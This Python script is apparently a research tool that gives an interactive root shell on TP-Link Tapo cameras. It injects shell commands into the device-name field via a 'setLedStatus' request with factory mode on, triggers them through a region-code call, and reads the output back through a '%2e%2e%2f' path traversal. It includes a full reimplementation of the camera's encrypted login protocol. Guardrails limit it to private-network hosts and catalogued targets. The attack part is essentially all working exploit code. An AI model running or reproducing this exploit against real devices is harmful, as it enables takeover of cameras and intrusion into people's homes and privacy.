#!/usr/bin/env python3

import argparse
import base64
import getpass
import hashlib
import http.client
import io
import json
import re
import secrets
import ssl
import sys
import time
from urllib.parse import quote

from tapo_target_catalog import add_target_args, select_target, target_label


class TapoHTTPResponse(http.client.HTTPResponse):
    def _read_status(self):
        line = self.fp.readline(http.client._MAXLINE + 1).decode("iso-8859-1")
        if len(line) > http.client._MAXLINE:
            raise http.client.LineTooLong("status line")
        if not line:
            raise http.client.RemoteDisconnected("Remote end closed connection without response")

        # Some stock builds echo an internal request buffer before the real status line.
        if "\x00" in line:
            status_start = line.rfind("HTTP/1.1 ")
            if status_start > 0:
                line = line[status_start:]
        parts = line.split(None, 2)
        if len(parts) < 2 or not parts[0].startswith("HTTP/"):
            self._close_conn()
            raise http.client.BadStatusLine(line)
        try:
            status = int(parts[1])
        except ValueError as exc:
            raise http.client.BadStatusLine(line) from exc
        if not 100 <= status <= 999:
            raise http.client.BadStatusLine(line)
        return parts[0], status, parts[2] if len(parts) > 2 else ""


C120_CONFIRMED_STATUSES = {"strong"}
C120_ROUTE_PRESENT_HARDENED_STATUSES = {"possible", "possible_lte_variant"}
C120_CURRENT_PAYLOAD_SUPPORTED_TARGET_IDS = {
    "tapo-c225-v2",
    "tapo-c260-v2",
    "tapo-c310-v1",
}
C120_ROUTE_SHAPE_REPORT = "analysis/c120_route_deep/c120_current_payload_shape_sweep_20260518.md"


SBOX = [
    0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76,
    0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0,
    0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15,
    0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75,
    0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84,
    0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF,
    0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8,
    0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2,
    0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73,
    0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB,
    0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79,
    0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08,
    0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A,
    0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E,
    0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF,
    0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16,
]

INV_SBOX = [0] * 256
for _i, _v in enumerate(SBOX):
    INV_SBOX[_v] = _i

RCON = [0x00, 0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36]


def sha256_hex(text: str) -> str:
    return hashlib.sha256(text.encode("utf-8")).hexdigest().upper()


def is_private_target(host: str) -> bool:
    lower = host.lower()
    if lower == "localhost" or lower.endswith(".local"):
        return True
    if re.match(r"^10\.", host):
        return True
    if re.match(r"^192\.168\.", host):
        return True
    match = re.match(r"^172\.(\d+)\.", host)
    return bool(match and 16 <= int(match.group(1)) <= 31)


def sh_quote(text: str) -> str:
    return "'" + text.replace("'", "'\"'\"'") + "'"


def base36(value: int) -> str:
    digits = "0123456789abcdefghijklmnopqrstuvwxyz"
    if value == 0:
        return "0"
    out = ""
    while value:
        value, rem = divmod(value, 36)
        out = digits[rem] + out
    return out


def with_cwd(cwd: str, command: str) -> str:
    if cwd == "/":
        return command
    return f"cd {sh_quote(cwd)}&&{command}"


def gmul(a: int, b: int) -> int:
    result = 0
    for _ in range(8):
        if b & 1:
            result ^= a
        carry = a & 0x80
        a = (a << 1) & 0xFF
        if carry:
            a ^= 0x1B
        b >>= 1
    return result


def key_expansion(key: bytes) -> list[list[int]]:
    if len(key) != 16:
        raise ValueError("AES-128 key must be 16 bytes")
    words = [list(key[i:i + 4]) for i in range(0, 16, 4)]
    for i in range(4, 44):
        temp = words[i - 1].copy()
        if i % 4 == 0:
            temp = temp[1:] + temp[:1]
            temp = [SBOX[b] for b in temp]
            temp[0] ^= RCON[i // 4]
        words.append([a ^ b for a, b in zip(words[i - 4], temp)])
    return [sum(words[i:i + 4], []) for i in range(0, 44, 4)]


def add_round_key(state: list[int], round_key: list[int]) -> None:
    for i in range(16):
        state[i] ^= round_key[i]


def sub_bytes(state: list[int]) -> None:
    for i in range(16):
        state[i] = SBOX[state[i]]


def inv_sub_bytes(state: list[int]) -> None:
    for i in range(16):
        state[i] = INV_SBOX[state[i]]


def shift_rows(state: list[int]) -> None:
    rows = [[state[r + 4 * c] for c in range(4)] for r in range(4)]
    for r in range(1, 4):
        rows[r] = rows[r][r:] + rows[r][:r]
    for r in range(4):
        for c in range(4):
            state[r + 4 * c] = rows[r][c]


def inv_shift_rows(state: list[int]) -> None:
    rows = [[state[r + 4 * c] for c in range(4)] for r in range(4)]
    for r in range(1, 4):
        rows[r] = rows[r][-r:] + rows[r][:-r]
    for r in range(4):
        for c in range(4):
            state[r + 4 * c] = rows[r][c]


def mix_columns(state: list[int]) -> None:
    for c in range(4):
        i = 4 * c
        a0, a1, a2, a3 = state[i:i + 4]
        state[i + 0] = gmul(a0, 2) ^ gmul(a1, 3) ^ a2 ^ a3
        state[i + 1] = a0 ^ gmul(a1, 2) ^ gmul(a2, 3) ^ a3
        state[i + 2] = a0 ^ a1 ^ gmul(a2, 2) ^ gmul(a3, 3)
        state[i + 3] = gmul(a0, 3) ^ a1 ^ a2 ^ gmul(a3, 2)


def inv_mix_columns(state: list[int]) -> None:
    for c in range(4):
        i = 4 * c
        a0, a1, a2, a3 = state[i:i + 4]
        state[i + 0] = gmul(a0, 14) ^ gmul(a1, 11) ^ gmul(a2, 13) ^ gmul(a3, 9)
        state[i + 1] = gmul(a0, 9) ^ gmul(a1, 14) ^ gmul(a2, 11) ^ gmul(a3, 13)
        state[i + 2] = gmul(a0, 13) ^ gmul(a1, 9) ^ gmul(a2, 14) ^ gmul(a3, 11)
        state[i + 3] = gmul(a0, 11) ^ gmul(a1, 13) ^ gmul(a2, 9) ^ gmul(a3, 14)


def aes_encrypt_block(block: bytes, round_keys: list[list[int]]) -> bytes:
    state = list(block)
    add_round_key(state, round_keys[0])
    for round_index in range(1, 10):
        sub_bytes(state)
        shift_rows(state)
        mix_columns(state)
        add_round_key(state, round_keys[round_index])
    sub_bytes(state)
    shift_rows(state)
    add_round_key(state, round_keys[10])
    return bytes(state)


def aes_decrypt_block(block: bytes, round_keys: list[list[int]]) -> bytes:
    state = list(block)
    add_round_key(state, round_keys[10])
    for round_index in range(9, 0, -1):
        inv_shift_rows(state)
        inv_sub_bytes(state)
        add_round_key(state, round_keys[round_index])
        inv_mix_columns(state)
    inv_shift_rows(state)
    inv_sub_bytes(state)
    add_round_key(state, round_keys[0])
    return bytes(state)


def pkcs7_pad(data: bytes) -> bytes:
    pad = 16 - (len(data) % 16)
    return data + bytes([pad]) * pad


def pkcs7_unpad(data: bytes) -> bytes:
    if not data:
        raise ValueError("empty AES plaintext")
    pad = data[-1]
    if pad < 1 or pad > 16 or data[-pad:] != bytes([pad]) * pad:
        raise ValueError("invalid PKCS#7 padding")
    return data[:-pad]


def aes_cbc_encrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    round_keys = key_expansion(key)
    prev = iv
    out = bytearray()
    padded = pkcs7_pad(data)
    for offset in range(0, len(padded), 16):
        block = padded[offset:offset + 16]
        mixed = bytes(a ^ b for a, b in zip(block, prev))
        enc = aes_encrypt_block(mixed, round_keys)
        out.extend(enc)
        prev = enc
    return bytes(out)


def aes_cbc_decrypt(data: bytes, key: bytes, iv: bytes) -> bytes:
    if len(data) % 16:
        raise ValueError("AES-CBC ciphertext length must be a multiple of 16")
    round_keys = key_expansion(key)
    prev = iv
    out = bytearray()
    for offset in range(0, len(data), 16):
        block = data[offset:offset + 16]
        dec = aes_decrypt_block(block, round_keys)
        out.extend(a ^ b for a, b in zip(dec, prev))
        prev = block
    return pkcs7_unpad(bytes(out))


def aes_encrypt_base64(plain_text: str, key: bytes, iv: bytes) -> str:
    return base64.b64encode(aes_cbc_encrypt(plain_text.encode("utf-8"), key, iv)).decode("ascii")


def aes_decrypt_base64(cipher_text: str, key: bytes, iv: bytes) -> str:
    raw = base64.b64decode(cipher_text)
    return aes_cbc_decrypt(raw, key, iv).decode("utf-8")


def http_request(host: str, path: str, method: str = "GET", body: bytes | None = None, headers: dict | None = None):
    context = ssl._create_unverified_context()
    conn = http.client.HTTPSConnection(host, timeout=15, context=context)
    conn.response_class = TapoHTTPResponse
    request_headers = dict(headers or {})
    if body is not None:
        request_headers.setdefault("Content-Length", str(len(body)))
    conn.request(method, path, body=body, headers=request_headers)
    response = conn.getresponse()
    data = response.read()
    result = {
        "status": response.status,
        "headers": dict(response.getheaders()),
        "body": data,
    }
    conn.close()
    return result


def login_once(host: str, username: str, pwd_hash: str):
    cnonce = secrets.token_hex(8).upper()
    login1_body = json.dumps({"method": "login", "params": {"cnonce": cnonce, "encrypt_type": "3", "username": username}}).encode()
    login1 = json.loads(http_request(host, "/", "POST", login1_body, {"Content-Type": "application/json"})["body"].decode())
    server_nonce = login1.get("result", {}).get("data", {}).get("nonce")
    if not server_nonce:
        err = RuntimeError(f"Handshake failed before nonce: {login1}")
        data = login1.get("result", {}).get("data", login1.get("data", {}))
        wait = data.get("sec_left", data.get("time"))
        err.wait_seconds = wait if isinstance(wait, (int, float)) else None
        raise err

    expected_confirm = sha256_hex(cnonce + pwd_hash + server_nonce) + server_nonce + cnonce
    device_confirm = login1.get("result", {}).get("data", {}).get("device_confirm")
    if device_confirm and device_confirm != expected_confirm:
        raise RuntimeError("Device confirmation failed.")

    digest_passwd = sha256_hex(pwd_hash + cnonce + server_nonce) + cnonce + server_nonce
    login2_body = json.dumps({
        "method": "login",
        "params": {"cnonce": cnonce, "encrypt_type": "3", "digest_passwd": digest_passwd, "username": username},
    }).encode()
    login2 = json.loads(http_request(host, "/", "POST", login2_body, {"Content-Type": "application/json"})["body"].decode())
    if login2.get("error_code") != 0:
        err = RuntimeError(f"Login failed: {login2}")
        wait = login2.get("result", {}).get("data", {}).get("time")
        err.wait_seconds = wait if isinstance(wait, (int, float)) else None
        raise err

    hashed_key = sha256_hex(cnonce + pwd_hash + server_nonce)
    key = bytes.fromhex(sha256_hex("lsk" + cnonce + server_nonce + hashed_key)[:32])
    iv = bytes.fromhex(sha256_hex("ivb" + cnonce + server_nonce + hashed_key)[:32])
    return {"stok": login2["result"]["stok"], "seq": int(login2["result"]["start_seq"]), "key": key, "iv": iv, "cnonce": cnonce}


def login_with_backoff(host: str, username: str, pwd_hash: str, attempts: int = 8):
    for attempt in range(attempts):
        try:
            return login_once(host, username, pwd_hash)
        except RuntimeError as err:
            wait = getattr(err, "wait_seconds", None)
            if wait is None or attempt == attempts - 1:
                raise
            wait = max(float(wait), 2.0)
            print(f"Login rejected/throttled, waiting {wait + 2:.0f}s...", file=sys.stderr)
            time.sleep(wait + 2)
    raise RuntimeError("unreachable")


class TapoSession:
    def __init__(self, host: str, pwd_hash: str, login: dict):
        self.host = host
        self.pwd_hash = pwd_hash
        self.stok = login["stok"]
        self.seq = login["seq"]
        self.key = login["key"]
        self.iv = login["iv"]
        self.cnonce = login["cnonce"]

    def secure_request(self, inner: dict):
        inner_json = json.dumps(inner, separators=(",", ":"))
        encrypted_inner = aes_encrypt_base64(inner_json, self.key, self.iv)
        outer_body_text = json.dumps({"method": "securePassthrough", "params": {"request": encrypted_inner}}, separators=(",", ":"))
        outer_body = outer_body_text.encode()
        tapo_tag = sha256_hex(sha256_hex(self.pwd_hash + self.cnonce) + outer_body_text + str(self.seq))
        try:
            response = http_request(
                self.host,
                f"/stok={self.stok}/ds",
                "POST",
                outer_body,
                {"Content-Type": "application/json", "Seq": str(self.seq), "Tapo_tag": tapo_tag},
            )
        finally:
            self.seq += 1
        secure = json.loads(response["body"].decode())
        if not secure.get("result", {}).get("response"):
            return secure
        inner_raw = aes_decrypt_base64(secure["result"]["response"], self.key, self.iv)
        return json.loads(inner_raw)


def set_runtime_name(session: TapoSession, dev_name: str, factory_enabled: bool):
    return session.secure_request({
        "method": "multipleRequest",
        "params": {
            "requests": [{
                "method": "setLedStatus",
                "params": {
                    "tp_manage": {
                        "info": {"dev_name": dev_name},
                        "factory_mode": {"enabled": "1" if factory_enabled else "0"},
                    }
                },
            }]
        },
    })


def trigger_region(session: TapoSession, region: str):
    return session.secure_request({
        "method": "multipleRequest",
        "params": {
            "requests": [{
                "method": "testUsrDefAudio",
                "params": {"device_info": {"set_region_code": {"region": region}}},
            }]
        },
    })


def encode_traversal_path(path_name: str) -> str:
    return "%2f".join(quote(part, safe="") for part in path_name.split("/"))


def fetch_output(host: str, session: TapoSession, output_path: str):
    output_path_encoded = encode_traversal_path(output_path)
    response = http_request(host, f"/stok={session.stok}/%2e%2e%2f{output_path_encoded}")
    return response["body"].decode("utf-8", errors="replace").rstrip("\0")


def run_command(
    host: str,
    session: TapoSession,
    command: str,
    output_path: str,
    region: str,
    restore_name: str,
    wait_ms: int,
    poll_ms: int,
    timeout_ms: int,
    restore_each: bool,
    debug_payload: bool,
):
    if not output_path.startswith("/tmp/") or not re.match(r"^/tmp/[A-Za-z0-9._-]+$", output_path):
        raise ValueError("Output path must be a simple /tmp filename.")
    if re.search(r"[\r\n\0]", command):
        raise ValueError("Command must be a single-line shell snippet.")

    payload = f";{command}>{output_path} 2>&1;#"
    if debug_payload:
        print(f"[payload {len(payload)} bytes] {payload}", file=sys.stderr)
    deadline = time.monotonic() + (timeout_ms / 1000)
    last_text = ""
    try:
        set_runtime_name(session, payload, True)
        time.sleep(0.1)
        trigger_region(session, region)
        time.sleep(wait_ms / 1000)

        while True:
            last_text = fetch_output(host, session, output_path)
            if last_text:
                return last_text
            if time.monotonic() >= deadline:
                return last_text
            time.sleep(poll_ms / 1000)
    finally:
        if restore_each:
            set_runtime_name(session, restore_name, False)


def parse_args():
    parser = argparse.ArgumentParser(description="Interactive command REPL for local Tapo cameras with the classic C120 route.")
    parser.add_argument("--host", help="Target Tapo camera IP/host. Prompts if omitted.")
    parser.add_argument("--user", help="Tapo username. Prompts if omitted.")
    parser.add_argument("--restore-name", default="C120 1.0 IPC", help="Device name restored after each command.")
    parser.add_argument("--region", default="ZZ", help="Region value used by trigger.")
    parser.add_argument("--wait-ms", type=int, default=150, help="Initial delay before polling command output.")
    parser.add_argument("--poll-ms", type=int, default=100, help="Polling interval while waiting for command output.")
    parser.add_argument("--timeout-ms", type=int, default=3000, help="Maximum time to wait for a command to produce output.")
    parser.add_argument("--restore-each", action="store_true", help="Restore factory mode off after every command instead of only on exit.")
    parser.add_argument("--debug-payload", action="store_true", help="Print the injected payload for troubleshooting.")
    parser.add_argument("--self-test-aes", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--self-test-http", action="store_true", help=argparse.SUPPRESS)
    parser.add_argument("--confirmed-only", action="store_true", help="Only list/select latest-firmware current-payload supported targets.")
    parser.add_argument(
        "--include-route-present-hardened",
        action="store_true",
        help="Also list/select route-present review targets. Running those requires --force-hardened-probe.",
    )
    parser.add_argument(
        "--force-hardened-probe",
        action="store_true",
        help="Allow running against a route-present hardened catalog target as a negative-control research probe.",
    )
    add_target_args(parser, "c120")
    return parser.parse_args()


def self_test_aes():
    key = bytes.fromhex("2b7e151628aed2a6abf7158809cf4f3c")
    plain = bytes.fromhex("6bc1bee22e409f96e93d7e117393172a")
    expected = "3ad77bb40d7a3660a89ecaf32466ef97"
    got = aes_encrypt_block(plain, key_expansion(key)).hex()
    if got != expected:
        raise AssertionError(f"AES block self-test failed: {got} != {expected}")
    if aes_decrypt_block(bytes.fromhex(expected), key_expansion(key)) != plain:
        raise AssertionError("AES decrypt self-test failed")


def self_test_http():
    lines = (
        b"HTTP/1.1 200 OK\r\n",
        b"POST /stok=x\0HTTP/1.1\0Content-Type\0 application/jsonHTTP/1.1 200 OK\r\n",
        b"POST /stok=x\0HTTP/1.1\0\0HTTP/1.1 200 OK\r\n",
    )
    for line in lines:
        response = TapoHTTPResponse.__new__(TapoHTTPResponse)
        response.fp = io.BytesIO(line)
        assert response._read_status()[:2] == ("HTTP/1.1", 200)


def main():
    args = parse_args()
    if args.self_test_aes:
        self_test_aes()
        print("AES self-test passed")
        return 0
    if args.self_test_http:
        self_test_http()
        print("HTTP self-test passed")
        return 0

    statuses = set(C120_CONFIRMED_STATUSES)
    target_ids = set(C120_CURRENT_PAYLOAD_SUPPORTED_TARGET_IDS)
    if args.include_route_present_hardened and not args.confirmed_only:
        statuses |= C120_ROUTE_PRESENT_HARDENED_STATUSES
        target_ids = None
    target = select_target(args, "c120", statuses, target_ids)
    if target:
        status = target["c120"]["status"]
        variant = target["c120"].get("routeVariant", "classic_wlan")
        print(f"Catalog target: {target_label(target)}; C120 route status={status}; variant={variant}", file=sys.stderr)
        if target["id"] not in C120_CURRENT_PAYLOAD_SUPPORTED_TARGET_IDS:
            print(
                "Warning: this target is route-present but is not in the latest-firmware current-payload support set. "
                f"Review {C120_ROUTE_SHAPE_REPORT} before probing.",
                file=sys.stderr,
            )
            if not args.force_hardened_probe:
                raise RuntimeError(
                    "Refusing non-supported latest-firmware target without --force-hardened-probe. "
                    f"See {C120_ROUTE_SHAPE_REPORT}."
                )
        if args.restore_name == "C120 1.0 IPC" and target["model"] != "Tapo_C120":
            print(
                "Warning: --restore-name is still the C120 default; pass the target camera's current name for clean restore.",
                file=sys.stderr,
            )

    host = args.host or input("Camera IP/host: ").strip()
    username = args.user or input("Tapo username: ").strip()
    if not host:
        raise RuntimeError("Camera IP/host is required.")
    if not username:
        raise RuntimeError("Tapo username is required.")
    if not is_private_target(host):
        raise RuntimeError("Refusing to target a non-private host.")

    password = getpass.getpass("Tapo password: ")
    if not password:
        raise RuntimeError("Password cannot be empty.")
    pwd_hash = sha256_hex(password)

    print(f"Logging in to {host} as {username}...", file=sys.stderr)
    login = login_with_backoff(host, username, pwd_hash)
    session = TapoSession(host, pwd_hash, login)
    cwd = "/"
    command_index = 0
    path_token = secrets.token_hex(2)

    print("Connected. Type commands, or 'exit' to quit.", file=sys.stderr)
    try:
        while True:
            try:
                line = input(f"tapo:{cwd}$ ").strip()
            except EOFError:
                print()
                break
            if not line:
                continue
            if line in {"exit", "quit"}:
                break
            if line == "pwd":
                print(cwd)
                continue
            if line.startswith("cd "):
                next_dir = line[3:].strip()
                command = with_cwd(cwd, f"cd {sh_quote(next_dir)}&&pwd")
                command_index += 1
                output_path = f"/tmp/o{path_token}{base36(command_index)}"
                text = run_command(
                    host,
                    session,
                    command,
                    output_path,
                    args.region,
                    args.restore_name,
                    args.wait_ms,
                    args.poll_ms,
                    args.timeout_ms,
                    args.restore_each,
                    args.debug_payload,
                )
                lines = [part for part in text.strip().splitlines() if part]
                if lines and lines[-1].startswith("/"):
                    cwd = lines[-1]
                print(text)
                continue

            command = with_cwd(cwd, line)
            command_index += 1
            output_path = f"/tmp/o{path_token}{base36(command_index)}"
            text = run_command(
                host,
                session,
                command,
                output_path,
                args.region,
                args.restore_name,
                args.wait_ms,
                args.poll_ms,
                args.timeout_ms,
                args.restore_each,
                args.debug_payload,
            )
            print(text, end="" if text.endswith("\n") or not text else "\n")
    finally:
        try:
            set_runtime_name(session, args.restore_name, False)
        except BaseException:
            pass
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
